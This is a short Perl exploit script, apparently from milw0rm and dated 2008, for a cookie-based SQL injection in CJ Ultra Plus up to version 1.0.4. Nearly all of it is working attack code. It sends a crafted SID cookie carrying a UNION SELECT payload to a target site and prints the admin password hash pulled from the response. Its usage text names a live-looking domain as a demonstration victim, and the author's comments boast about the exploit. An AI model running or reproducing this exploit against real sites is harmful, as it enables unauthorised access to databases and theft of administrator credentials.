#!/usr/bin/perl
#
#	CJ Ultra Plus <= v1.0.4 Cookie SQL Injection
#
#	found and coded by -SmoG-  /\GermAn hAckZ0r
#	contact: ICQ - 266836394
# 
#	
#	
#
#	hints:	- sometimes the parameter "SID" is different to the normal one... 
#			- i extract the hash from the html-code... but i was 2 lazy for coding a good working filter
#			- salted DES (normaly "aa" will be the salt, but it can be different)
#			- ive spend about 1 hour for this source... its my first exploit in perl... so plz be friendly with ur feedback...
#
#
#			>>> GretzZz 2: pronoobz.org - Wesker, China Sun and all other memberZz <<<

use LWP::UserAgent;
 
if ($#ARGV+1 !=1) {
print "\n### CJ Ultra Plus <= v1.0.4 Cookie SQL Injection Exploit###\n";
print "found and coded by -SmoG-\n";
print "\n\nUsage: perl xploit.pl -victim\n";
print "       perl xploit.pl http://gayxboy.com/\n\n";				#LiVe-Dem0! letZz pwnz the pedophile!!
exit();
}
print "\n### CJ Ultra Plus <= v1.0.4 Cookie SQL Injection Exploit###\n";
print "\nstarting exploit...";
$target=$ARGV[0];
chomp($target);
if($target !~ /^http:\/\//)
{
	$target = "http://".$target;
}
if($target !~ /\/$/)
{
	$target .= "/";
}
@header = ('Cookie' => "SID='UNION SELECT b12 from settings/*");
$ua = LWP::UserAgent->new;
$ua->timeout(10);
$ua->env_proxy;
$ua->agent("Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8.1.12) Gecko/20080201 Firefox/2.0.0.12");
$response = $ua->get($target, @header);
if ($response->is_success)
{
$temp = $response->content;
if ($temp =~/(.*)SID=(.*);/)
	{
	$result=substr($temp,85,13); 
	print "\n\adminhash: "; print $result;
	}
}
else
{
 die "Error: ".$response->status_line;
}

# milw0rm.com [2008-09-22]
